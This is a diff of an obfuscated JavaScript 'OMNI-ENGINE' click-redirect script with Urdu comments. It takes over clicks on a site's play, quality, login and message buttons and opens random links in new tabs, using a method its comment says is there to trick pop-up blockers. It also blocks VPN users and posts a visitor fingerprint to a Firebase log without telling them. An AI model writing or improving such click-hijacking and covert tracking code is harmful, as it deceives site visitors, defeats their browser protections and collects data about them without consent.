@@ -1,11 +1,10 @@
 /**
- * THE OMNI-ENGINE - MANAGER CHACHA V5.0 (DEBUG READY)
- * Main Logic: 15-Point, IP Geofencing, Firebase, 9-Click Algorithm
+ * THE OMNI-ENGINE - MANAGER CHACHA V5.1 (SILENT LIMIT)
+ * Fixed: ID Syntax, New Tab Issue, Silent 9-Click for Testing
  */
 
 const CHACHA_CONFIG = {
-    // ٹیسٹنگ کے لیے یہ سوئچ 'true' رکھیں، فائنل کرتے وقت اسے 'false' کر دیں
-    DEBUG_MODE: true, 
+    DEBUG_MODE: true, // ٹیسٹنگ کے دوران اسے true رکھیں
 
     LINKS: [
         "https://www.blackbox.ai/", "https://chat.deepseek.com/", "https://chatgpt.com/", 
@@ -32,7 +31,6 @@ const _0xEngine = {
     _baskets: { h: [], n: [], l: [] },
 
     init: function() {
-        // Domain Check - Bypass if Local/Debug
         if (!CHACHA_CONFIG.DEBUG_MODE && !window.location.hostname.includes(CHACHA_CONFIG.SETTINGS.DOMAIN)) return;
         
         this._baskets.h = CHACHA_CONFIG.LINKS.slice(0, 10);
@@ -64,18 +62,29 @@ const _0xEngine = {
     },
 
     _jump: function(_u) {
-        if(CHACHA_CONFIG.DEBUG_MODE) console.log("%c[DEBUG] Redirecting to: " + _u, "color: cyan; font-weight: bold;");
-        const _w = window.open('', '_blank');
-        _w.opener = null;
-        _w.document.write(`<html><head><meta name="referrer" content="no-referrer"><meta http-equiv="refresh" content="0; url=${_u}"></head></html>`);
-        _w.document.close();
+        if(CHACHA_CONFIG.DEBUG_MODE) console.log("[DEBUG] Triggering New Tab: " + _u);
+        
+        // NEW TAB FIX: Pop-up blockers کو چکمہ دینے کا طریقہ
+        const _newTab = window.open('about:blank', '_blank');
+        if (_newTab) {
+            _newTab.location.href = _u;
+            _newTab.focus();
+        } else {
+            // اگر براؤزر سخت بلاکر استعمال کر رہا ہے تو اسی پیج پر کھولے گا
+            window.location.assign(_u);
+        }
     },
 
     _log: function(_id, _dna) {
         if (CHACHA_CONFIG.DEBUG_MODE) console.table(_dna);
         
-        // Firebase Logging
-        fetch(`${CHACHA_CONFIG.APIS.FB_URL}/logs.json`, { method: 'POST', body: JSON.stringify({ btn: _id, dna: _dna, ts: new Date().toISOString() }) });
+        // Firebase URL چیک کرنے کے بعد ڈیٹا بھیجے گا
+        if (CHACHA_CONFIG.APIS.FB_URL.startsWith('http')) {
+            fetch(`${CHACHA_CONFIG.APIS.FB_URL}/logs.json`, { 
+                method: 'POST', 
+                body: JSON.stringify({ btn: _id, dna: _dna, ts: new Date().toISOString() }) 
+            }).catch(e => console.error("Log Error"));
+        }
     },
 
     _lock: function() {
@@ -87,40 +96,47 @@ const _0xEngine = {
 // --- Click Logic ---
 document.addEventListener('click', async (e) => {
     const _btn = e.target.closest('[id]');
-    const _validIds = ['tag-btn-play-main','tag-input-message-field
-', 'tag-btn-back-button', 'tag-btn-server-shift-2', 'tag-btn-q-360', 'tag-btn-q-720', 'tag-btn-q-1080', 'tag-btn-q-4k', 'tag-btn-auth-login', 'tag-btn-auth-send','tag-link-community-rules','tag-btn-community-showmore
-'];
+    
+    // IDs کو درست فارمیٹ میں کر دیا گیا ہے
+    const _validIds = [
+        'tag-btn-play-main', 
+        'tag-input-message-field', 
+        'tag-btn-back-button', 
+        'tag-btn-server-shift-2', 
+        'tag-btn-q-360', 
+        'tag-btn-q-720', 
+        'tag-btn-q-1080', 
+        'tag-btn-q-4k', 
+        'tag-btn-auth-login', 
+        'tag-btn-auth-send', 
+        'tag-link-community-rules', 
+        'tag-btn-community-showmore'
+    ];
 
     if (_btn && _validIds.includes(_btn.id)) {
         
-        // 1. 9-Click Logic Check
+        // SILENT 9-CLICK LOGIC
         if (_0xEngine._c >= CHACHA_CONFIG.SETTINGS.MAX_CLICKS) {
             if (CHACHA_CONFIG.DEBUG_MODE) {
-                console.warn("[DEBUG] 9-Click Limit reached, but bypassing for test.");
+                console.warn("[DEBUG] Click limit (9) exceeded, but continuing due to DEBUG_MODE.");
             } else {
                 window.location.href = CHACHA_CONFIG.SETTINGS.CLEAN_PAGE;
                 return;
             }
         }
 
-        // 2. DNA Scan (VPN/Proxy Logic)
         const _dna = await _0xEngine._scan();
         if (_dna.v && !CHACHA_CONFIG.DEBUG_MODE) {
             alert("VPN Detected! Access Denied.");
             return;
-        } else if (_dna.v && CHACHA_CONFIG.DEBUG_MODE) {
-            console.error("[DEBUG] VPN Detected, but bypassing for test.");
         }
 
-        // 3. Logging
         _0xEngine._log(_btn.id, _dna);
 
-        // 4. Algorithm (80/10/10 Logic)
         const _luck = Math.random() * 100;
         let _pool = _luck < 80 ? _0xEngine._baskets.h : (_luck < 90 ? _0xEngine._baskets.n : _0xEngine._baskets.l);
         const _finalLink = _pool[Math.floor(Math.random() * _pool.length)];
 
-        // 5. Update Click Count
         _0xEngine._c++;
         localStorage.setItem('_m_c_', _0xEngine._c);
         
